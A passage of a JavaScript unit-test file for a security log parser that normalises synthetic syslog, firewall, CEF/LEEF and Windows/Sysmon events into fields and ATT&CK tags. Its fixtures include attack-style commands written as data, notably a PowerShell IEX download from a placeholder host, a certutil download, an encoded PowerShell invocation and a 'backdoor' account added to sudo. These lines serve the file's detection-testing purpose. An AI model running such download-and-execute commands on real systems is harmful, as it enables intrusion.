// Copyright (c) 2026 Citynet Work and Zyberon Information Technology, Saudi Arabia. All rights reserved. Proprietary and confidential - see LICENSE.
'use strict';
// Parser unit tests. ALL LOG LINES BELOW ARE SYNTHETIC TEST DATA written for these tests in the public vendor
// formats (host names test-*, documentation IP ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, RFC1918).
const test = require('node:test');
const assert = require('node:assert/strict');
const { createParser } = require('../engine/parse');
const { CATEGORIES, OUTCOMES, FIELD_NAMES } = require('../engine/schema');
const util = require('../engine/parse/util');

const parser = createParser();
const RTS = Date.UTC(2024, 4, 1, 12, 0, 0);
const p = (line, meta = {}) => parser.parse(line, { collector: 'syslog-tcp', src_id: 'test-src', peer_ip: '10.0.0.9', rts: RTS, tz_offset_min: 0, ...meta });

function valid(ev) {
  for (const f of FIELD_NAMES) assert.ok(f in ev, 'missing field ' + f);
  assert.ok(CATEGORIES.includes(ev.category), 'bad category ' + ev.category);
  assert.ok(OUTCOMES.includes(ev.outcome), 'bad outcome ' + ev.outcome);
  assert.ok(ev.severity >= 0 && ev.severity <= 4);
  assert.equal(typeof ev.ts, 'number');
  assert.match(ev.id, /^[0-9a-f-]{36}$/);
  for (const v of Object.values(ev.fields)) assert.equal(typeof v, 'string');
  return ev;
}

test('util: time parsing variants', () => {
  assert.equal(util.parseTime('2024-05-01T10:00:00.123Z'), Date.UTC(2024, 4, 1, 10, 0, 0, 123));
  assert.equal(util.parseTime('2024-05-01 10:00:00', 180), Date.UTC(2024, 4, 1, 7, 0, 0));
  assert.equal(util.parseTime('10/Oct/2023:13:55:36 +0300'), Date.UTC(2023, 9, 10, 10, 55, 36));
  assert.equal(util.parseTime('/Date(1714557600123)/'), 1714557600123);
  assert.equal(util.parseTime('1714557600'), 1714557600000);
  assert.equal(util.parseTime('1714557600123456789'), 1714557600123);
  assert.equal(util.parseTime('May 01 2024 10:00:00'), Date.UTC(2024, 4, 1, 10, 0, 0));
  // year inference: a December timestamp received in January belongs to the previous year
  assert.equal(util.parseTime('Dec 31 23:59:59', 0, Date.UTC(2025, 0, 1, 0, 0, 5)), Date.UTC(2024, 11, 31, 23, 59, 59));
});

test('util: key=value with quoted values', () => {
  const kv = util.parseKV('a=1 b="two words" c="esc \\"q\\"" d= e=x');
  assert.deepEqual(kv, { a: '1', b: 'two words', c: 'esc "q"', d: '', e: 'x' });
});

test('rfc3164: sshd accepted with PRI and BSD timestamp', () => {
  const ev = valid(p('<38>May  1 10:00:00 test-host-01 sshd[2211]: Accepted publickey for alice from 192.0.2.10 port 50522 ssh2: RSA SHA256:SYNTHETIC'));
  assert.equal(ev.src_type, 'linux');
  assert.equal(ev.host, 'test-host-01');
  assert.equal(ev.ts, Date.UTC(2024, 4, 1, 10, 0, 0));
  assert.equal(ev.category, 'authentication');
  assert.equal(ev.action, 'logon');
  assert.equal(ev.outcome, 'success');
  assert.equal(ev.user, 'alice');
  assert.equal(ev.src_ip, '192.0.2.10');
  assert.equal(ev.src_port, 50522);
  assert.equal(ev.fields.auth_method, 'publickey');
  assert.equal(ev.fields.pid, '2211');
  assert.equal(ev.collector, 'syslog-tcp');
  assert.equal(ev.src_id, 'test-src');
  assert.equal(ev.host_ip, '10.0.0.9');
});

test('rfc3164: tz offset from source applied', () => {
  const ev = p('<38>May  1 10:00:00 test-host-01 sshd[1]: Accepted password for bob from 192.0.2.11 port 1 ssh2', { tz_offset_min: 180 });
  assert.equal(ev.ts, Date.UTC(2024, 4, 1, 7, 0, 0));
});

test('linux: sshd failures, invalid user', () => {
  let ev = valid(p('<38>May  1 10:00:01 test-host-01 sshd[2212]: Failed password for invalid user admin from 203.0.113.50 port 41000 ssh2'));
  assert.equal(ev.action, 'logon-failed');
  assert.equal(ev.outcome, 'failure');
  assert.equal(ev.user, 'admin');
  assert.equal(ev.fields.invalid_user, 'true');
  assert.ok(ev.tags.includes('T1110'));
  ev = valid(p('<38>May  1 10:00:02 test-host-01 sshd[2212]: Failed password for root from 203.0.113.50 port 41001 ssh2'));
  assert.equal(ev.user, 'root');
  assert.equal(ev.fields.invalid_user, undefined);
  ev = valid(p('<38>May  1 10:00:03 test-host-01 sshd[2213]: Invalid user oracle from 203.0.113.51 port 41002'));
  assert.equal(ev.action, 'logon-failed');
  assert.equal(ev.user, 'oracle');
});

test('linux: sudo success and failure, su, useradd, usermod, UFW, cron, systemd', () => {
  let ev = valid(p('<85>May  1 10:01:00 test-host-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx'));
  assert.equal(ev.action, 'sudo');
  assert.equal(ev.outcome, 'success');
  assert.equal(ev.user, 'alice');
  assert.equal(ev.target_user, 'root');
  assert.equal(ev.cmdline, '/usr/bin/systemctl restart nginx');
  ev = valid(p('<85>May  1 10:01:01 test-host-01 sudo:    mallory : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash'));
  assert.equal(ev.outcome, 'failure');
  assert.equal(ev.severity, 2);
  ev = valid(p('<86>May  1 10:01:02 test-host-01 su: FAILED SU (to root) mallory on pts/1'));
  assert.equal(ev.action, 'su');
  assert.equal(ev.outcome, 'failure');
  assert.equal(ev.target_user, 'root');
  ev = valid(p('<86>May  1 10:01:03 test-host-01 useradd[900]: new user: name=backdoor, UID=1002, GID=1002, home=/home/backdoor, shell=/bin/bash, from=/dev/pts/0'));
  assert.equal(ev.action, 'user-created');
  assert.equal(ev.category, 'iam');
  assert.equal(ev.target_user, 'backdoor');
  ev = valid(p("<86>May  1 10:01:04 test-host-01 usermod[901]: add 'backdoor' to group 'sudo'"));
  assert.equal(ev.action, 'group-member-added');
  assert.equal(ev.severity, 3);
  assert.equal(ev.fields.group, 'sudo');
  ev = valid(p('<4>May  1 10:01:05 test-host-01 kernel: [12345.678901] [UFW BLOCK] IN=eth0 OUT= MAC=00:00:00:00:00:00 SRC=203.0.113.9 DST=10.0.0.5 LEN=60 TOS=0x00 PREC=0x00 TTL=50 ID=0 DF PROTO=TCP SPT=51515 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0'));
  assert.equal(ev.category, 'network');
  assert.equal(ev.action, 'blocked');
  assert.equal(ev.src_ip, '203.0.113.9');
  assert.equal(ev.dst_port, 22);
  assert.equal(ev.proto, 'tcp');
  ev = valid(p('<78>May  1 10:02:00 test-host-01 CRON[3001]: (root) CMD (/usr/local/bin/test-backup.sh --synthetic)'));
  assert.equal(ev.action, 'cron');
  assert.equal(ev.user, 'root');
  ev = valid(p('<30>May  1 10:02:01 test-host-01 systemd[1]: Failed to start test-app.service - Synthetic Test App.'));
  assert.equal(ev.action, 'service-failed');
  assert.equal(ev.outcome, 'failure');
});

test('rfc5424: header, structured data, generic fallback keeps source type', () => {
  const line = '<165>1 2024-05-01T10:00:00.000Z test-host-02 test-app 1234 ID47 [exampleSDID@32473 iut="3" eventSource="Application"] synthetic application message';
  const ev = valid(p(line, { src_type: 'syslog' }));
  assert.equal(ev.src_type, 'syslog');
  assert.equal(ev.host, 'test-host-02');
  assert.equal(ev.ts, Date.UTC(2024, 4, 1, 10, 0, 0));
  assert.equal(ev.fields['sd.exampleSDID@32473.iut'], '3');
  assert.equal(ev.fields.app, 'test-app');
  assert.equal(ev.message, 'synthetic application message');
  assert.equal(ev.severity, 0); // pri 165 → sev 5 (notice) → 0
  const ev2 = valid(p('<165>1 2024-05-01T10:00:00Z test-host-02 postfix - - - synthetic mail line', { src_type: 'linux' }));
  assert.equal(ev2.src_type, 'linux');
  assert.equal(ev2.action, 'log');
});

test('rfc5424: sshd inside 5424 routes to linux parser', () => {
  const ev = valid(p('<38>1 2024-05-01T10:00:00+03:00 test-host-03 sshd 77 - - Failed password for carol from 198.51.100.7 port 2222 ssh2'));
  assert.equal(ev.src_type, 'linux');
  assert.equal(ev.action, 'logon-failed');
  assert.equal(ev.ts, Date.UTC(2024, 4, 1, 7, 0, 0));
});

test('webaccess: nginx combined, apache vhost_combined, syslog-wrapped', () => {
  let ev = valid(p('198.51.100.23 - - [01/May/2024:10:00:00 +0300] "GET /portal/login?next=%2F HTTP/1.1" 200 5120 "https://test-site.example/" "Mozilla/5.0 (SyntheticTest)"', { src_type: 'nginx' }));
  assert.equal(ev.src_type, 'nginx');
  assert.equal(ev.category, 'web');
  assert.equal(ev.action, 'http-request');
  assert.equal(ev.outcome, 'success');
  assert.equal(ev.src_ip, '198.51.100.23');
  assert.equal(ev.http_method, 'GET');
  assert.equal(ev.url, '/portal/login?next=%2F');
  assert.equal(ev.http_status, 200);
  assert.equal(ev.user_agent, 'Mozilla/5.0 (SyntheticTest)');
  assert.equal(ev.ts, Date.UTC(2024, 4, 1, 7, 0, 0));
  assert.equal(ev.fields.bytes, '5120');
  ev = valid(p('test-site.example:443 203.0.113.77 - jdoe [01/May/2024:10:00:01 +0000] "POST /api/upload HTTP/2.0" 500 12 "-" "curl/8.0-synthetic"'));
  assert.equal(ev.src_type, 'nginx');
  assert.equal(ev.fields.vhost, 'test-site.example');
  assert.equal(ev.fields.vhost_port, '443');
  assert.equal(ev.user, 'jdoe');
  assert.equal(ev.outcome, 'failure');
  assert.equal(ev.severity, 1);
  ev = valid(p('<190>May  1 10:00:02 test-web-01 nginx: 192.0.2.44 - - [01/May/2024:10:00:02 +0000] "GET /wp-login.php HTTP/1.1" 404 153 "-" "SyntheticScanner/1.0" 0.001'));
  assert.equal(ev.src_type, 'nginx');
  assert.equal(ev.host, 'test-web-01');
  assert.equal(ev.http_status, 404);
  assert.equal(ev.fields.extra, '0.001');
});

test('fortigate: traffic deny, traffic accept, ips, av, webfilter, ssl-vpn fail, admin login, config change', () => {
  let ev = valid(p('<189>date=2024-05-01 time=10:00:00 devname="test-fw-01" devid="FGT60FTK0000TEST" eventtime=1714557600123456789 tz="+0300" logid="0000000013" type="traffic" subtype="forward" level="notice" vd="root" srcip=10.1.1.5 srcport=51234 srcintf="port1" dstip=203.0.113.80 dstport=445 dstintf="wan1" proto=6 action="deny" policyid=0 service="SMB" trandisp="noop" duration=0 sentbyte=0 rcvdbyte=0'));
  assert.equal(ev.src_type, 'fortigate');
  assert.equal(ev.host, 'test-fw-01');
  assert.equal(ev.category, 'network');
  assert.equal(ev.action, 'blocked');
  assert.equal(ev.outcome, 'failure');
  assert.equal(ev.src_ip, '10.1.1.5');
  assert.equal(ev.dst_port, 445);
  assert.equal(ev.proto, 'tcp');
  assert.equal(ev.ts, 1714557600123);
  assert.equal(ev.event_code, '0000000013');
  assert.equal(ev.severity, 1);
  assert.equal(ev.fields.service, 'SMB');
  ev = valid(p('date=2024-05-01 time=10:00:01 devname="test-fw-01" devid="FGT60FTK0000TEST" logid="0000000013" type="traffic" subtype="forward" level="notice" srcip=10.1.1.6 srcport=40000 dstip=198.51.100.53 dstport=53 proto=17 action="accept" policyid=5 user="CORP\\Alice"', { tz_offset_min: 180 }));
  assert.equal(ev.action, 'allowed');
  assert.equal(ev.outcome, 'success');
  assert.equal(ev.proto, 'udp');
  assert.equal(ev.user, 'alice');
  assert.equal(ev.domain, 'corp');
  assert.equal(ev.ts, Date.UTC(2024, 4, 1, 7, 0, 1));
  ev = valid(p('date=2024-05-01 time=10:00:02 devname="test-fw-01" logid="0419016384" type="utm" subtype="ips" eventtype="signature" level="alert" severity="critical" srcip=203.0.113.66 dstip=10.1.1.20 srcport=4444 dstport=80 proto=6 action="dropped" attack="Synthetic.Test.Exploit" attackid=99999 msg="web_server: Synthetic.Test.Exploit"'));
  assert.equal(ev.action, 'ips-detection');
  assert.equal(ev.severity, 4);
  assert.equal(ev.outcome, 'failure');
  assert.equal(ev.fields.attack, 'Synthetic.Test.Exploit');
  ev = valid(p('date=2024-05-01 time=10:00:03 devname="test-fw-01" logid="0211008192" type="utm" subtype="virus" eventtype="infected" level="warning" srcip=198.51.100.9 dstip=10.1.1.30 action="blocked" virus="EICAR_TEST_FILE" filename="eicar.com" url="/download/eicar.com" hostname="test-download.example" analyticscksum="275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"'));
  assert.equal(ev.category, 'malware');
  assert.equal(ev.action, 'av-detection');
  assert.equal(ev.hash, '275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f');
  assert.equal(ev.url, 'test-download.example/download/eicar.com');
  ev = valid(p('date=2024-05-01 time=10:00:04 devname="test-fw-01" logid="0316013056" type="utm" subtype="webfilter" eventtype="ftgd_blk" level="warning" srcip=10.1.1.7 dstip=203.0.113.99 action="blocked" hostname="test-bad.example" url="/payload" catdesc="Malicious Websites" method="domain"'));
  assert.equal(ev.category, 'web');
  assert.equal(ev.action, 'blocked');
  ev = valid(p('date=2024-05-01 time=10:00:05 devname="test-fw-01" logid="0101039426" type="event" subtype="vpn" level="alert" action="ssl-login-fail" tunneltype="ssl-web" remip=203.0.113.200 user="bob" reason="sslvpn_login_permission_denied" msg="SSL user failed to logged in"'));
  assert.equal(ev.category, 'authentication');
  assert.equal(ev.action, 'logon-failed');
  assert.equal(ev.src_ip, '203.0.113.200');
  assert.equal(ev.user, 'bob');
  assert.ok(ev.tags.includes('vpn'));
  ev = valid(p('date=2024-05-01 time=10:00:06 devname="test-fw-01" logid="0100032002" type="event" subtype="system" level="alert" user="admin" ui="https(203.0.113.201)" action="login" status="failed" reason="passwd_invalid" msg="Administrator admin login failed from https(203.0.113.201) because of invalid password"'));
  assert.equal(ev.action, 'logon-failed');
  assert.equal(ev.src_ip, '203.0.113.201');
  assert.ok(ev.tags.includes('admin'));
  ev = valid(p('date=2024-05-01 time=10:00:07 devname="test-fw-01" logid="0100044547" type="event" subtype="system" level="information" user="admin" ui="GUI(10.1.1.2)" action="Edit" cfgtid=1 cfgpath="firewall.policy" cfgobj="5" msg="Edit firewall.policy 5"'));
  assert.equal(ev.action, 'config-change');
  assert.equal(ev.category, 'policy');
});

test('cef: header escapes, extension with spaces, labels, severity', () => {
  const ev = valid(p('<134>May  1 10:00:00 test-ids-01 CEF:0|Synthetic Vendor|Test IDS|1.0|100\\|200|Suspicious Test Traffic|8|src=203.0.113.5 dst=10.2.2.2 spt=1234 dpt=443 proto=TCP act=blocked suser=CORP\\\\eve msg=synthetic message with spaces and a\\=b cs1Label=Rule cs1=TEST-RULE-1 rt=1714557600000 request=https://test.example/a?b\\=c'));
  assert.equal(ev.src_type, 'cef');
  assert.equal(ev.event_code, '100|200');
  assert.equal(ev.severity, 3);
  assert.equal(ev.src_ip, '203.0.113.5');
  assert.equal(ev.dst_port, 443);
  assert.equal(ev.proto, 'tcp');
  assert.equal(ev.user, 'eve');
  assert.equal(ev.fields.Rule, 'TEST-RULE-1');
  assert.equal(ev.ts, 1714557600000);
  assert.match(ev.message, /synthetic message with spaces and a=b/);
  assert.equal(ev.url, 'https://test.example/a?b=c');
  assert.equal(ev.category, 'network'); // "Test IDS" → ips-detection
  assert.equal(ev.action, 'ips-detection');
});

test('leef: 1.0 tab-delimited and 2.0 custom delimiter', () => {
  let ev = valid(p('LEEF:1.0|Synthetic|TestFW|2.0|DENY|src=203.0.113.8\tdst=10.3.3.3\tsrcPort=5555\tdstPort=3389\tproto=6\tusrName=frank\tsev=6\tcat=firewall\taction=deny'));
  assert.equal(ev.src_type, 'leef');
  assert.equal(ev.src_ip, '203.0.113.8');
  assert.equal(ev.dst_port, 3389);
  assert.equal(ev.user, 'frank');
  assert.equal(ev.severity, 2);
  assert.equal(ev.action, 'blocked');
  ev = valid(p('<13>May  1 10:00:00 test-host-04 LEEF:2.0|Synthetic|TestAuth|1.0|LoginFail|^|src=198.51.100.44^usrName=grace^cat=Authentication^outcome=failure^sev=4'));
  assert.equal(ev.category, 'authentication');
  assert.equal(ev.action, 'logon-failed');
  assert.equal(ev.user, 'grace');
  assert.equal(ev.host, 'test-host-04');
});

test('cisco: ASA deny, built outbound, AAA reject, admin login; IOS login failed and config', () => {
  let ev = valid(p('<164>May 01 2024 10:00:00 test-asa-01 : %ASA-4-106023: Deny tcp src outside:203.0.113.14/4444 dst inside:10.0.0.5/22 by access-group "OUTSIDE_IN" [0x0, 0x0]'));
  assert.equal(ev.src_type, 'cisco');
  assert.equal(ev.host, 'test-asa-01');
  assert.equal(ev.action, 'blocked');
  assert.equal(ev.src_ip, '203.0.113.14');
  assert.equal(ev.dst_port, 22);
  assert.equal(ev.fields.acl, 'OUTSIDE_IN');
  assert.equal(ev.event_code, '106023');
  assert.equal(ev.ts, Date.UTC(2024, 4, 1, 10, 0, 0));
  ev = valid(p('<166>%ASA-6-302013: Built outbound TCP connection 123456 for outside:198.51.100.10/443 (198.51.100.10/443) to inside:10.1.1.5/51000 (203.0.113.1/51000)'));
  assert.equal(ev.action, 'connection');
  assert.equal(ev.src_ip, '10.1.1.5');
  assert.equal(ev.dst_ip, '198.51.100.10');
  assert.equal(ev.dst_port, 443);
  ev = valid(p('<166>%ASA-6-113015: AAA user authentication Rejected : reason = AAA failure : local database : user = testuser : user IP = 203.0.113.30'));
  assert.equal(ev.action, 'logon-failed');
  assert.equal(ev.user, 'testuser');
  assert.equal(ev.src_ip, '203.0.113.30');
  ev = valid(p('<166>%ASA-6-605004: Login denied from 203.0.113.31/51234 to outside:198.51.100.1/ssh for user "admin"'));
  assert.equal(ev.action, 'logon-failed');
  assert.equal(ev.user, 'admin');
  ev = valid(p('<188>52: test-rtr-01: *May  1 10:00:00.123 UTC: %SEC_LOGIN-4-LOGIN_FAILED: Login failed [user: admin] [Source: 203.0.113.40] [localport: 22] [Reason: Login Authentication Failed] at 10:00:00 UTC Wed May 1 2024'));
  assert.equal(ev.action, 'logon-failed');
  assert.equal(ev.src_ip, '203.0.113.40');
  assert.equal(ev.host, 'test-rtr-01');
  assert.equal(ev.event_code, 'SEC_LOGIN-4-LOGIN_FAILED');
  ev = valid(p('<189>53: test-rtr-01: *May  1 10:00:01.000 UTC: %SYS-5-CONFIG_I: Configured from console by admin on vty0 (10.1.1.2)'));
  assert.equal(ev.action, 'config-change');
  assert.equal(ev.user, 'admin');
  assert.equal(ev.src_ip, '10.1.1.2');
});

const W = (eid, ed, extra = {}) => JSON.stringify({ Channel: 'Security', EventID: eid, TimeCreated: '2024-05-01T10:00:00.000Z', Computer: 'TEST-DC-01.test.local', RecordId: 1000 + eid, Level: 0, ProviderName: 'Microsoft-Windows-Security-Auditing', EventData: ed, ...extra });

test('windows: logon success / failure / logoff / explicit / special privileges', () => {
  let ev = valid(p(W(4624, { SubjectUserName: 'TEST-DC-01$', TargetUserName: 'Alice', TargetDomainName: 'TEST', LogonType: '10', IpAddress: '::ffff:192.0.2.60', IpPort: '50000', ProcessName: 'C:\\Windows\\System32\\svchost.exe', WorkstationName: 'TEST-WS-01' }), { src_type: 'windows', collector: 'agent' }));
  assert.equal(ev.src_type, 'windows');
  assert.equal(ev.host, 'test-dc-01.test.local');
  assert.equal(ev.action, 'logon');
  assert.equal(ev.user, 'alice');
  assert.equal(ev.domain, 'test');
  assert.equal(ev.src_ip, '192.0.2.60');
  assert.equal(ev.fields.logon_type, '10');
  assert.ok(ev.tags.includes('rdp'));
  assert.equal(ev.event_code, '4624');
  assert.equal(ev.ts, Date.UTC(2024, 4, 1, 10, 0, 0));
  ev = valid(p(W(4625, { TargetUserName: 'bob', TargetDomainName: 'TEST', LogonType: '3', IpAddress: '203.0.113.70', Status: '0xC000006D', SubStatus: '0xC000006A' })));
  assert.equal(ev.action, 'logon-failed');
  assert.equal(ev.outcome, 'failure');
  assert.equal(ev.fields.failure_reason, 'bad password');
  assert.ok(ev.tags.includes('T1110'));
  ev = valid(p(W(4634, { TargetUserName: 'alice', TargetDomainName: 'TEST', LogonType: '3' })));
  assert.equal(ev.action, 'logoff');
  ev = valid(p(W(4647, { TargetUserName: 'alice', TargetDomainName: 'TEST' })));
  assert.equal(ev.action, 'logoff');
  ev = valid(p(W(4648, { SubjectUserName: 'alice', SubjectDomainName: 'TEST', TargetUserName: 'svc_backup', TargetDomainName: 'TEST', TargetServerName: 'test-fs-01', IpAddress: '-', ProcessName: 'C:\\Windows\\System32\\runas.exe' })));
  assert.equal(ev.action, 'logon-explicit');
  assert.equal(ev.user, 'alice');
  assert.equal(ev.target_user, 'svc_backup');
  ev = valid(p(W(4672, { SubjectUserName: 'Administrator', SubjectDomainName: 'TEST', PrivilegeList: 'SeDebugPrivilege\n\t\t\tSeBackupPrivilege' })));
  assert.equal(ev.action, 'privileges-assigned');
  assert.ok(ev.tags.includes('admin'));
});

test('windows: process creation with encoded PowerShell, service and task installs', () => {
  let ev = valid(p(W(4688, { SubjectUserName: 'alice', SubjectDomainName: 'TEST', NewProcessName: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', ParentProcessName: 'C:\\Windows\\System32\\cmd.exe', CommandLine: 'powershell.exe -NoP -enc UwB5AG4AdABoAGUAdABpAGMA', NewProcessId: '0x1a2b' })));
  assert.equal(ev.category, 'process');
  assert.equal(ev.action, 'process-start');
  assert.match(ev.process, /powershell\.exe$/);
  assert.match(ev.parent_process, /cmd\.exe$/);
  assert.ok(ev.tags.includes('T1059.001'));
  ev = valid(p(W(4697, { SubjectUserName: 'alice', SubjectDomainName: 'TEST', ServiceName: 'TestSvc', ServiceFileName: '"C:\\Temp\\test svc.exe" -k run', ServiceType: '0x10', ServiceStartType: '2' })));
  assert.equal(ev.action, 'service-installed');
  assert.equal(ev.process, 'C:\\Temp\\test svc.exe');
  assert.ok(ev.tags.includes('T1543.003'));
  ev = valid(p(W(4698, { SubjectUserName: 'alice', SubjectDomainName: 'TEST', TaskName: '\\TestTask', TaskContent: '<Task><Actions><Exec><Command>C:\\Windows\\System32\\cmd.exe</Command><Arguments>/c echo synthetic</Arguments></Exec></Actions></Task>' })));
  assert.equal(ev.action, 'scheduled-task-created');
  assert.equal(ev.cmdline, 'C:\\Windows\\System32\\cmd.exe /c echo synthetic');
  assert.ok(ev.tags.includes('T1053.005'));
  ev = valid(p(JSON.stringify({ Channel: 'System', EventID: 7045, TimeCreated: '/Date(1714557600000)/', Computer: 'TEST-SRV-01', Level: 4, ProviderName: 'Service Control Manager', EventData: [{ Name: 'ServiceName', Value: 'PSEXESVC' }, { Name: 'ImagePath', Value: '%SystemRoot%\\PSEXESVC.exe' }, { Name: 'AccountName', Value: 'LocalSystem' }] })));
  assert.equal(ev.action, 'service-installed');
  assert.equal(ev.fields.service_name, 'PSEXESVC');
  assert.equal(ev.ts, 1714557600000);
});

test('windows: account management and group membership', () => {
  const cases = [
    [4720, 'user-created'], [4722, 'user-enabled'], [4723, 'password-change'], [4724, 'password-reset'],
    [4725, 'user-disabled'], [4726, 'user-deleted'],
  ];
  for (const [eid, action] of cases) {
    const ev = valid(p(W(eid, { SubjectUserName: 'admin1', SubjectDomainName: 'TEST', TargetUserName: 'NewUser', TargetDomainName: 'TEST', TargetSid: 'S-1-5-21-0-0-0-1105' })));
    assert.equal(ev.category, 'iam', String(eid));
    assert.equal(ev.action, action, String(eid));
    assert.equal(ev.user, 'admin1');
    assert.equal(ev.target_user, 'newuser');
  }
  for (const eid of [4728, 4732, 4756]) {
    const ev = valid(p(W(eid, { SubjectUserName: 'admin1', SubjectDomainName: 'TEST', MemberName: 'CN=Test User\\, Jr,OU=Staff,DC=test,DC=local', MemberSid: 'S-1-5-21-0-0-0-1106', TargetUserName: 'Domain Admins', TargetDomainName: 'TEST' })));
    assert.equal(ev.action, 'group-member-added');
    assert.equal(ev.target_user, 'test user, jr');
    assert.equal(ev.fields.group, 'Domain Admins');
    assert.equal(ev.severity, 3);
    assert.ok(ev.tags.includes('T1098'));
  }
  const ev = valid(p(W(4740, { TargetUserName: 'bob', TargetDomainName: 'TEST-WS-07', SubjectUserName: 'TEST-DC-01$', SubjectDomainName: 'TEST' })));
  assert.equal(ev.action, 'account-locked');
  assert.equal(ev.target_user, 'bob');
  assert.equal(ev.fields.caller_computer, 'TEST-WS-07');
});

test('windows: kerberos / NTLM, log clear, PowerShell 4104', () => {
  let ev = valid(p(W(4768, { TargetUserName: 'carol', TargetDomainName: 'TEST.LOCAL', IpAddress: '::ffff:10.5.5.5', Status: '0x0', PreAuthType: '0', TicketEncryptionType: '0x17' })));
  assert.equal(ev.action, 'kerberos-tgt');
  assert.ok(ev.tags.includes('T1558.004'));
  ev = valid(p(W(4768, { TargetUserName: 'carol', TargetDomainName: 'TEST.LOCAL', IpAddress: '10.5.5.5', Status: '0x6' })));
  assert.equal(ev.action, 'logon-failed');
  assert.equal(ev.fields.failure_reason, 'unknown principal');
  ev = valid(p(W(4769, { TargetUserName: 'carol@TEST.LOCAL', TargetDomainName: 'TEST.LOCAL', ServiceName: 'svc_sql', IpAddress: '::ffff:10.5.5.6', Status: '0x0', TicketEncryptionType: '0x17' })));
  assert.equal(ev.action, 'kerberos-service-ticket');
  assert.equal(ev.user, 'carol');
  assert.ok(ev.tags.includes('T1558.003'));
  ev = valid(p(W(4771, { TargetUserName: 'dave', IpAddress: '::ffff:10.5.5.7', Status: '0x18' })));
  assert.equal(ev.action, 'logon-failed');
  assert.equal(ev.fields.failure_reason, 'bad password (pre-auth)');
  ev = valid(p(W(4776, { TargetUserName: 'erin', Workstation: 'TEST-WS-02', Status: '0xC000006A' })));
  assert.equal(ev.action, 'logon-failed');
  ev = valid(p(W(4776, { TargetUserName: 'erin', Workstation: 'TEST-WS-02', Status: '0x0' })));
  assert.equal(ev.action, 'credential-validated');
  ev = valid(p(JSON.stringify({ Channel: 'Security', EventID: 1102, TimeCreated: '2024-05-01T10:00:00Z', Computer: 'TEST-DC-01', ProviderName: 'Microsoft-Windows-Eventlog', EventData: { LogFileCleared: { SubjectUserName: 'mallory', SubjectDomainName: 'TEST' } } })));
  assert.equal(ev.action, 'audit-log-cleared');
  assert.equal(ev.user, 'mallory');
  assert.ok(ev.tags.includes('T1685.005'));
  ev = valid(p(JSON.stringify({ Channel: 'Microsoft-Windows-PowerShell/Operational', EventID: 4104, TimeCreated: '2024-05-01T10:00:00Z', Computer: 'TEST-WS-03', Level: 5, ProviderName: 'Microsoft-Windows-PowerShell', EventData: { MessageNumber: '1', MessageTotal: '1', ScriptBlockText: "IEX (New-Object Net.WebClient).DownloadString('http://test.invalid/synthetic.ps1')", ScriptBlockId: 'aaaaaaaa-0000-0000-0000-000000000000', Path: '' } })));
  assert.equal(ev.action, 'script-block');
  assert.equal(ev.severity, 2);
  assert.ok(ev.tags.includes('suspicious-script'));
  assert.ok(ev.tags.includes('T1059.001'));
});

test('windows: sysmon 1 / 3 / 11 / 13 / 22', () => {
  const S = (eid, ed) => JSON.stringify({ Channel: 'Microsoft-Windows-Sysmon/Operational', EventID: eid, TimeCreated: '2024-05-01T10:00:00Z', Computer: 'TEST-WS-04', Level: 4, ProviderName: 'Microsoft-Windows-Sysmon', EventData: ed });
  let ev = valid(p(S(1, { Image: 'C:\\Windows\\System32\\certutil.exe', ParentImage: 'C:\\Windows\\explorer.exe', CommandLine: 'certutil -urlcache -split -f http://test.invalid/x.bin x.bin', User: 'TEST\\Frank', Hashes: 'MD5=00000000000000000000000000000000,SHA256=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA', ProcessId: '4242' })));
  assert.equal(ev.action, 'process-start');
  assert.equal(ev.user, 'frank');
  assert.equal(ev.domain, 'test');
  assert.equal(ev.hash, 'a'.repeat(64));
  assert.ok(ev.tags.includes('T1105'));
  ev = valid(p(S(3, { Image: 'C:\\Test\\beacon.exe', User: 'TEST\\frank', Protocol: 'tcp', SourceIp: '10.9.9.9', SourcePort: '50001', DestinationIp: '203.0.113.123', DestinationPort: '8443', DestinationHostname: 'test-c2.invalid', Initiated: 'true' })));
  assert.equal(ev.category, 'network');
  assert.equal(ev.dst_ip, '203.0.113.123');
  assert.equal(ev.dst_port, 8443);
  assert.equal(ev.fields.dst_hostname, 'test-c2.invalid');
  ev = valid(p(S(11, { Image: 'C:\\Test\\drop.exe', TargetFilename: 'C:\\Users\\frank\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.lnk' })));
  assert.equal(ev.category, 'file');
  assert.ok(ev.tags.includes('T1547.001'));
  ev = valid(p(S(13, { Image: 'C:\\Test\\drop.exe', EventType: 'SetValue', TargetObject: 'HKU\\S-1-5-21-0\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\TestUpdater', Details: 'C:\\Test\\drop.exe' })));
  assert.equal(ev.category, 'registry');
  assert.equal(ev.action, 'registry-set');
  assert.ok(ev.tags.includes('T1547.001'));
  ev = valid(p(S(22, { Image: 'C:\\Test\\beacon.exe', QueryName: 'Test-C2.invalid', QueryStatus: '0', QueryResults: '::ffff:203.0.113.123;' })));
  assert.equal(ev.category, 'dns');
  assert.equal(ev.dns_query, 'test-c2.invalid');
});

test('windows: via HTTP ingest with pre-parsed object (meta.obj)', () => {
  const obj = { Channel: 'Security', EventID: '4625', TimeCreated: '2024-05-01T10:00:00Z', Computer: 'TEST-WS-05', EventData: { TargetUserName: 'x', IpAddress: '203.0.113.1', Status: '0xc000006d', SubStatus: '0xc0000064' } };
  const ev = valid(parser.parse(JSON.stringify(obj), { collector: 'agent', src_id: 'test-agent', src_type: 'windows', peer_ip: '10.0.0.10', rts: RTS, obj }));
  assert.equal(ev.action, 'logon-failed');
  assert.equal(ev.fields.failure_reason, 'no such user');
  assert.equal(ev.collector, 'agent');
});

test('m365: sign-in failure, directory audit role assignment, unified audit inbox rule', () => {
